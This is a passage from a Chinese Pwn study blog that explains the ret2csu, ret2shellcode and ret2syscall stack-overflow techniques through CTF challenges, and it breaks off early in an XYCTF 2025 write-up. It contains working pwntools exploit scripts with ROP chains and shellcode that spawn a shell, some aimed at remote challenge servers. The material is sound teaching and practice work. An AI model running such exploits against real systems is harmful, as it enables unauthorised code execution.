20241112125825</figcaption></figure><p><code>pop rdx</code>是缺失的，所以我们要利用ret2csu技术来向这三个寄存器内置入我们想要的值，我们要存入的值如下表：</p><table><thead><tr class="header"><th>register</th><th>value</th></tr></thead><tbody><tr class="odd"><td><code>rdi</code></td><td>1</td></tr><tr class="even"><td><code>rsi</code></td><td><code>write</code>函数的<code>got</code>表地址</td></tr><tr class="odd"><td><code>rdx</code></td><td>写数据的长度</td></tr></tbody></table><p>ret2csu的一些细节在这里不多赘述，我们直接看<code>__libc_csu_init</code>函数的汇编，可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122002130.png" alt="Pasted image 20241112130544" /><figcaption>Pasted image 20241112130544</figcaption></figure><p>以及：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122003547.png" alt="Pasted image 20241112130600" /><figcaption>Pasted image 20241112130600</figcaption></figure><p>从第一块可以看出寄存器之间有如下对应关系：</p><ol type="1"><li><code>r14</code>寄存器对应<code>rdx</code></li><li><code>r13</code>寄存器对应<code>rsi</code></li><li><code>r12</code>寄存器的低32位对应<code>rdi</code>的低32位（即<code>edi</code>）</li></ol><p>故对于第二块，几个寄存器中要存入的值如下表所示：</p><table><thead><tr class="header"><th>register</th><th>value</th></tr></thead><tbody><tr class="odd"><td><code>rbx</code></td><td>0</td></tr><tr class="even"><td><code>rbp</code></td><td>1</td></tr><tr class="odd"><td><code>r12</code></td><td>1</td></tr><tr class="even"><td><code>r13</code></td><td><code>write</code>函数的<code>got</code>表地址</td></tr><tr class="odd"><td><code>r14</code></td><td>写数据的长度</td></tr><tr class="even"><td><code>r15</code></td><td><code>write</code>函数的<code>got</code>表地址</td></tr></tbody></table><p>所以我们可以通过构造如下payload来获取<code>write</code>函数的got表地址：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_chain)  </span><br><span class="line">payload += p64(<span class="number">0</span>)          <span class="comment">#add rsp, 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)          <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)          <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(<span class="number">1</span>)          <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(write_got)  <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>)      <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(write_got)  <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(mov_reg) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(main)</span><br></pre></td></tr></table></figure><p>其中<code>pop_chain=0x4012A6</code>指从栈顶<code>pop</code>元素到寄存器的那串汇编，<code>mov_reg=0x401290</code>指移动寄存器的那串汇编。</p><p>那么我们就可以通过ret2libc来获得shell了，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">21504</span>)  </span><br><span class="line">  </span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2csu&quot;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]  </span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]  </span><br><span class="line">main = <span class="number">0x4011DC</span>  </span><br><span class="line">  </span><br><span class="line"><span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">write(fd, buf, count)  </span></span><br><span class="line"><span class="string">fd: rdi  </span></span><br><span class="line"><span class="string">buf: rsi  </span></span><br><span class="line"><span class="string">count: rdx  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">pop_chain = <span class="number">0x4012A6</span>  </span><br><span class="line">mov_reg = <span class="number">0x401290</span>  </span><br><span class="line">pop_rdi = <span class="number">0x4012b3</span>  </span><br><span class="line">ret = <span class="number">0x40101a</span>  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_chain)  </span><br><span class="line">payload += p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(<span class="number">0</span>)  </span><br><span class="line">payload += p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(<span class="number">1</span>)  </span><br><span class="line">payload += p64(write_got)  </span><br><span class="line">payload += p64(<span class="number">0x100</span>)  </span><br><span class="line">payload += p64(write_got)  </span><br><span class="line">payload += p64(mov_reg) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span> + p64(main)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input:\n&quot;</span>, payload)  </span><br><span class="line">write_real_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] the real address of write is&quot;</span>, <span class="built_in">hex</span>(write_real_addr))  </span><br><span class="line">  </span><br><span class="line">libc_base = write_real_addr - libc.sym[<span class="string">&quot;write&quot;</span>]  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] the base address of libc is&quot;</span>, <span class="built_in">hex</span>(libc_base))  </span><br><span class="line">  </span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]  </span><br><span class="line">sh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] the address of system is&quot;</span>, <span class="built_in">hex</span>(system))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] the address of /bin/sh is&quot;</span>, <span class="built_in">hex</span>(sh))  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rdi) + p64(sh) + p64(system) + p64(ret)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Input:\n&quot;</span>, payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>（这题给了<code>libc</code>，就不用我们这么费心思去找了）</p><p>结果如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122007052.png" alt="Pasted image 20241112134228" /><figcaption>Pasted image 20241112134228</figcaption></figure><h2 id="ret2csu">ret2csu</h2><p>在64位程序中存在一段万能的gadgets代码，这段代码可以控制<code>rbx</code>,<code>rbp</code>,<code>r12</code>,<code>r13</code>,<code>r14</code>,<code>r15</code>,<code>rdx</code>,<code>rsi</code>及<code>edi</code>(<code>rdi</code>的低32位)，同时可以<code>call</code>指定的地址，而这段代码存在于<code>__libc_csu_init</code>（用于动态链接的程序中对libc的初始化）这个函数之中，这个函数的汇编代码如下（截取自某道题目的汇编代码）：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122009110.png" alt="Pasted image 20241112162146" /><figcaption>Pasted image 20241112162146</figcaption></figure><p>值得我们注意的有两段：</p><p>第一段（记为csu1）为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     rdx, r14</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     edi, r12d</span><br><span class="line">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">add     rbx, 1</span><br><span class="line">cmp     rbp, rbx</span><br><span class="line">jnz     short loc_401290</span><br></pre></td></tr></table></figure><p>前三行分别表示： 1. 将寄存器<code>r14</code>的值赋给<code>rdx</code> 2. 将寄存器<code>r13</code>的值赋给<code>rsi</code> 3. 将寄存器<code>r12</code>的低32位的值赋给<code>edi</code>（<code>rdi</code>的低32位）</p><p>后面一行（<code>ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</code>）会调用<code>r15+rbx*8</code>指向的函数（值得注意的是，有时候<code>r12</code>会与<code>r15</code>的用法对调）；最后三行则表示将<code>rbx+1</code>与<code>rbp</code>进行比较，若不相等则会重复执行这一段段汇编代码，在一般利用的时候，我们会令<code>rbx</code>等于0，而<code>rbp</code>等于1，这既能直接调用<code>r15</code>指向的函数，也能通过这个比较.</p><p>而值得注意的第二段（记为csu2）为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>这段代码首先将<code>rsp</code>加8，这行代码一般可以忽略，而后面则是依次将栈顶元素弹出至<code>rbx</code>,<code>rbp</code>,<code>r12</code>,<code>r13</code>,<code>r14</code>,<code>r15</code>通过这段汇编以及上面提到的那一段汇编，我们可以控制的寄存器有：<code>rbx</code>,<code>rbp</code>,<code>rdx</code>,<code>rsi</code>,<code>rdi</code>的低32位（即<code>edi</code>）,<code>r12</code>,<code>r13</code>,<code>r14</code>及<code>r15</code>，通过这两段代码，我们就可以控制很多参数，算是一段万能的gadgets.</p><p>在利用的时候，我们一般会先执行csu2，将一些我们想要的参数压入栈之后依次弹出到对应寄存器中，再去执行csu1，我们注意到，csu1的末尾并没有<code>ret</code>，也就是说，在执行完<code>csu1</code>之后，程序还会再次执行csu2，所以在构造payload的时候，若我们不需要再次操控寄存器的值，就可以在<code>csu1</code>之后添加一串长度为0x38（也就是7乘8）的垃圾数据（如果要操控就再构造一次就行）。</p><blockquote><p>在csu2里面隐藏了一段<code>pop rdi</code>以及一段<code>pop rsi</code>，因为<code>pop rdi</code>的机器码为<code>5F</code>，而<code>pop r15</code>的机器码为<code>41 5F</code>，这个时候我们就可以截取<code>pop r15</code>的后半段来得到<code>pop rdi</code>；又由于<code>pop rsi</code>的机器码为<code>5E</code>，而而<code>pop r14</code>的机器码为<code>41 5E</code>，所以我们就可以截取<code>pop r14</code>的后半段来得到<code>pop rsi</code>，所以需要利用<code>pop rdi</code>与<code>pop rsi</code>两段汇编的时候往往会来这里找.</p></blockquote><h4 id="例0xgame-2024-week1-ret2csu">例：[0xgame 2024 Week1] ret2csu</h4><p>题目附件在这里能找到：<a href="https://github.com/X1cT34m/0xGame2024/tree/main/Pwn">0xGame2024/Pwn at main · X1cT34m/0xGame2024</a></p><p>checksec可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122012129.png" alt="Pasted image 20241113112943" /><figcaption>Pasted image 20241113112943</figcaption></figure><p>并没有开启任何保护，看到<code>main</code>函数有:</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122014626.png" alt="Pasted image 20241113113338" /><figcaption>Pasted image 20241113113338</figcaption></figure><p>这里让我们向<code>something</code>中输入一些东西，显然这个<code>something</code>在内存中，而后面要输入<code>buf</code>，<code>buf</code>的空间为16字节，但是可以输入的字节数为0x60，明显存在栈溢出，但是后面对<code>buf</code>的长度进行比较，要求不能超过0x10，我们可以通过<code>\x00</code>截断来绕过，现在我们看溢出之后我们需要执行什么操作，寻找发现有一个函数：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122016828.png" alt="Pasted image 20241113113921" /><figcaption>Pasted image 20241113113921</figcaption></figure><p>里面有一个需要传入参数的<code>execve</code>，可以看到它的三个参数分别为：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122018757.png" alt="Pasted image 20241113114018" /><figcaption>Pasted image 20241113114018</figcaption></figure><p>三个参数分别是：</p><ol type="1"><li><code>filename</code>，存在<code>rdi</code>寄存器内，表示准备载入当前进程空间的新程序的路径名；</li><li><code>argv[]</code>，存在<code>rsi</code>寄存器内，表示传给新进程的命令行参数；</li><li><code>envp[]</code>，讯在<code>rdx</code>寄存器内，指定了新程序的环境列表.</li></ol><p>所以我们要利用<code>execve</code>这个函数，我们向三个寄存器中存入数据的对应关系如下：</p><table><thead><tr class="header"><th>register</th><th>value</th></tr></thead><tbody><tr class="odd"><td><code>rdi</code></td><td><code>/bin/sh</code>的地址</td></tr><tr class="even"><td><code>rsi</code></td><td>0</td></tr><tr class="odd"><td><code>rdx</code></td><td>0</td></tr></tbody></table><p>对于<code>/bin/sh</code>，我们可以通过向<code>something</code>中写入来得到，现在解决向函数内传入参数的问题，通过查找可以发现：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122030853.png" alt="Pasted image 20241113130147" /><figcaption>Pasted image 20241113130147</figcaption></figure><p>缺少<code>pop rdx</code>这一条重要的指令，所以我们考虑使用ret2csu，观察该程序的<code>__libc_csu_init</code>函数，可以发现有如下两段汇编：</p><p>第一段为（记作<code>csu1</code>）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_4013A0:</span><br><span class="line">mov     rdx, r14</span><br><span class="line">mov     rsi, r13</span><br><span class="line">mov     edi, r12d</span><br><span class="line">call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">add     rbx, 1</span><br><span class="line">cmp     rbp, rbx</span><br><span class="line">jnz     short loc_4013A0</span><br></pre></td></tr></table></figure><p>第二段为（记作<code>csu2</code>）： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add     rsp, 8</span><br><span class="line">pop     rbx</span><br><span class="line">pop     rbp</span><br><span class="line">pop     r12</span><br><span class="line">pop     r13</span><br><span class="line">pop     r14</span><br><span class="line">pop     r15</span><br><span class="line">retn</span><br></pre></td></tr></table></figure> 由<code>csu1</code>中各寄存器的对应关系，我们可以通过<code>csu2</code>向寄存器中存入如下数据：</p><table><thead><tr class="header"><th>register</th><th>value</th></tr></thead><tbody><tr class="odd"><td><code>rbx</code></td><td>0</td></tr><tr class="even"><td><code>rbp</code></td><td>1</td></tr><tr class="odd"><td><code>r12</code></td><td><code>/bin/sh</code>的地址</td></tr><tr class="even"><td><code>r13</code></td><td>0</td></tr><tr class="odd"><td><code>r14</code></td><td>0</td></tr><tr class="even"><td><code>r15</code></td><td><code>execve</code>的got表地址</td></tr></tbody></table><p>第一段为（记作<code>csu1</code>）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;=Triode=&#x27;</span></span><br><span class="line">payload += p64(csu2)</span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># add rsp, 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(sh)          <span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop r14</span></span><br><span class="line">payload += p64(execve_got)  <span class="comment"># pop r15</span></span><br><span class="line">payload += p64(csu1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x38</span> + p64(main)</span><br></pre></td></tr></table></figure><p>所以我们可以写出攻击代码如下（由于赛题环境早已关闭，故这里在本地打）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x4013A0</span></span><br><span class="line">csu2 = <span class="number">0x4013B6</span></span><br><span class="line">sh = <span class="number">0x404090</span></span><br><span class="line">main = <span class="number">0x401275</span></span><br><span class="line">execve_got = elf.got[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;The little doll is tired, say goodnight to her~\n&#x27;</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;=Triode=&#x27;</span></span><br><span class="line">payload += p64(csu2)</span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># add rsp, 8</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp</span></span><br><span class="line">payload += p64(sh)          <span class="comment"># pop r12</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop r13</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment"># pop r14</span></span><br><span class="line">payload += p64(execve_got)  <span class="comment"># pop r15</span></span><br><span class="line">payload += p64(csu1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x38</span> + p64(main)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;What else do you want to do?\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure> 运行可以得到shell：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122034586.png" alt="Pasted image 20241113132718" /><figcaption>Pasted image 20241113132718</figcaption></figure><h2 id="ret2shellcode">ret2shellcode</h2><p>ret2shellcode指通过栈溢出控制程序执行shellcode，而shellcode往往需要我们自己编写，而在<code>pwntools</code>中可以利用<code>asm(shellcraft.sh())</code>进行编写，在一些情况下也会用到一些特殊的shellcode，此时我们要向程序中填充可执行的代码。</p><p>在栈溢出的基础上，若想执行shellcode，则我们写入shellcode的区域一定要有可执行权限（例如<code>bss</code>段，<code>data</code>段，没有被保护的<code>stack</code>段以及可写可执行的<code>heap</code>段）</p><h4 id="例hnctf-2022-week1-ret2shellcode">例：[HNCTF 2022 Week1] ret2shellcode</h4><p>题目：<a href="https://www.nssctf.cn/problem/2934">HNCTF 2022 Week1-ret2shellcode | NSSCTF</a></p><p>checksec可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122036344.png" alt="Pasted image 20241113134704" /><figcaption>Pasted image 20241113134704</figcaption></figure><p>发现堆栈不可执行，但是没有其他保护，利用IDA打开后可以看到main函数：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122038785.png" alt="Pasted image 20241113134814" /><figcaption>Pasted image 20241113134814</figcaption></figure><p>可以看到我们需要输入一个字符串<code>s</code>，发现在这个<code>read</code>函数处存在栈溢出，但只能刚刚好覆盖到返回地址，又可以看到：<code>strcpy(buff, s)</code>将我们输入的字符串<code>s</code>被复制到了<code>buff</code>上面，我们可以看到，<code>buff</code>是在<code>bss</code>段上的：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122040729.png" alt="Pasted image 20241113135034" /><figcaption>Pasted image 20241113135034</figcaption></figure><p>所以我们可以利用ret2shellcode技术，向<code>buff</code>中写入shellcode，然后通过栈溢出来执行<code>buff</code>中的shellcode即可，攻击代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>, <span class="number">25511</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buff = <span class="number">0x4040A0</span></span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(buff)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行就可以得到shell了：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122042827.png" alt="Pasted image 20241113135748" /><figcaption>Pasted image 20241113135748</figcaption></figure><blockquote><p>注：一般而言，程序都会开启堆栈保护，所以我们通常会向<code>bss</code>段或<code>data</code>段写入shellcode，有时候也会利用<a href="#ret2csu">ret2csu</a>与<a href="#ret2syscall">ret2syscall</a>来向可读可写可执行区段写入shellcode来攻击</p></blockquote><h2 id="ret2syscall">ret2syscall</h2><p>ret2syscall顾名思义就是控制系统执行系统调用来获得shell，一般在程序静态链接的情况下使用（因为静态链接的时候没有办法使用ret2libc技术进行get shell）</p><p>在32位程序中，ret2syscall主要依赖于<code>int 0x80</code>汇编段，而在64位系统中，ret2syscall则主要依赖于<code>syscall</code>汇编段，这两段汇编都会通过调用一些寄存器的值来进行系统调用，Linux系统的系统调用可以实现的函数，对应的编号以及参数所存放的寄存器可以在<a href="https://www.chromium.org/chromium-os/developer-library/reference/linux-constants/syscalls/">Linux System Call Table</a>中查询，常用的一般有<code>read</code>，<code>write</code>以及<code>execve</code>。ret2syscall有时需要用到<a href="#ret2csu">ret2csu</a>的技术来向指定寄存器来写入想要的内容。</p><h4 id="例ciscn-2023-初赛-烧烤摊儿">例：[CISCN 2023 初赛] 烧烤摊儿</h4><p>题目：<a href="https://www.nssctf.cn/problem/4055">CISCN 2023 初赛-烧烤摊儿 | NSSCTF</a></p><p>通过<code>file</code>命令可以看到这是个静态链接的程序：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122044673.png" alt="Pasted image 20250429233754" /><figcaption>Pasted image 20250429233754</figcaption></figure><p>直接IDA反编译可以看到：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122046274.png" alt="Pasted image 20250429232748" /><figcaption>Pasted image 20250429232748</figcaption></figure><p>显然有一个类似商店菜单的东西，发现有个<code>if ( own )</code>的判断，交叉引用<code>own</code>这个变量发现会进入<code>vip</code>函数，该函数代码如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122048298.png" alt="Pasted image 20250429233057" /><figcaption>Pasted image 20250429233057</figcaption></figure><p>（因为编码问题，中文并不能正常显示）</p><p>通过对功能的分析可以大致知道当我们余额大于<code>100000</code>的时候可以把商店买下来（也就是让<code>own</code>等于<code>1</code>），此时我们就可以进入<code>gaiming</code>函数（可以给商店改名）。翻阅函数发现<code>pijiu</code>这个函数在购买的时候似乎并没有对数量进行限制：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122050234.png" alt="Pasted image 20250429233343" /><figcaption>Pasted image 20250429233343</figcaption></figure><p>也就是说我们可以通过购买负数数量的商品来让自己的余额增加，从而买下商店，先看看<code>gaiming</code>函数：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122052253.png" alt="Pasted image 20250429233528" /><figcaption>Pasted image 20250429233528</figcaption></figure><p>可以看到我们可以通过<code>scanf</code>输入字符串进行改名，并将改的名字放到处于data段上的<code>name</code>中，因为是静态链接的程序，所以并不能通过ret2libc技术来get shell，那么就可能需要使用ret2syscall技术来get shell了，通过ROPgadget可以找到<code>syscall</code>所在的位置：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122054136.png" alt="Pasted image 20250429234159" /><figcaption>Pasted image 20250429234159</figcaption></figure><p>通过查询可以知道在64位程序中<code>execve</code>的系统调用编号为<code>0x3b</code>（存放在<code>rax</code>寄存器中），且<code>rdi</code>，<code>rsi</code>，<code>rdx</code>寄存器中分别存放<code>filename</code>，<code>argv</code>以及<code>envp</code>，（三个参数的意义在ret2csu的<a href="#例：%5B0xgame%202024%20Week1%5D%20ret2csu">例题</a>中有提及）那么我们可以通过构造<code>execve('/bin/sh', 0, 0)</code>来实现获得shell，通过寻找可以分别找到<code>pop rax</code>，<code>pop rdi</code>，<code>pop rsi</code>以及一条<code>pop rdx pop rbx</code>，那么就可以通过先向处于data段的<code>name</code>中存入<code>/bin/sh</code>，随后构造如下rop链即可通过ret2syscall来获得shell：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(sh) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx_pop_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)</span><br></pre></td></tr></table></figure><p>由此可以得到最终的攻击代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">p = remote(<span class="string">&quot;ip&quot;</span>, port)    </span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x40264f</span>  </span><br><span class="line">pop_rax = <span class="number">0x458827</span>  </span><br><span class="line">pop_rsi = <span class="number">0x40a67e</span>  </span><br><span class="line">pop_rdx_pop_rbx = <span class="number">0x4a404b</span>  </span><br><span class="line">syscall = <span class="number">0x402404</span>  </span><br><span class="line">sh = <span class="number">0x4E60F0</span>  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">p.recv()  </span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">p.recv()  </span><br><span class="line">p.sendline(<span class="string">b&#x27;-1000000&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)  </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x20</span> - <span class="number">8</span>) + <span class="string">b&#x27;=Triode=&#x27;</span> + p64(pop_rax) + p64(<span class="number">59</span>) + p64(pop_rdi) + p64(sh) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx_pop_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(syscall)  </span><br><span class="line">  </span><br><span class="line">p.recv()  </span><br><span class="line">p.sendline(payload)  </span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure> 结果如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250430122056393.png" alt="Pasted image 20250429235342" /><figcaption>Pasted image 20250429235342</figcaption></figure><p>在一些情况下也可以通过ret2syscall来对其他函数进行调用来达到目标，在此就不过多赘述了.</p>]]></content>
      
      
      <categories>
          
          <category> Pwn笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF 2025 部分题目Write Up</title>
      <link href="/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/"/>
      <url>/2025/04/10/XYCTF-2025-%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AEWrite-Up/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年明明说以后都不打这比赛的，今年还是来打了_(:3 」∠ )_</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Division"><a href="#Division" class="headerlink" title="Division"></a>Division</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random   </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;----Welcome to my division calc----&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">menu:  </span></span><br><span class="line"><span class="string">      [1]  Division calc      </span></span><br><span class="line"><span class="string">      [2]  Get flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:  </span><br><span class="line">    choose = <span class="built_in">input</span>(<span class="string">&#x27;: &gt;&gt;&gt; &#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> choose == <span class="string">&#x27;1&#x27;</span>:  </span><br><span class="line">        <span class="keyword">try</span>:  </span><br><span class="line">            denominator = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;input the denominator: &gt;&gt;&gt; &#x27;</span>))  </span><br><span class="line">        <span class="keyword">except</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;INPUT NUMBERS&#x27;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        nominator = random.getrandbits(<span class="number">32</span>)  </span><br><span class="line">        <span class="keyword">if</span> denominator == <span class="string">&#x27;0&#x27;</span>:  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;NO YOU DONT&#x27;</span>)  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line">        <span 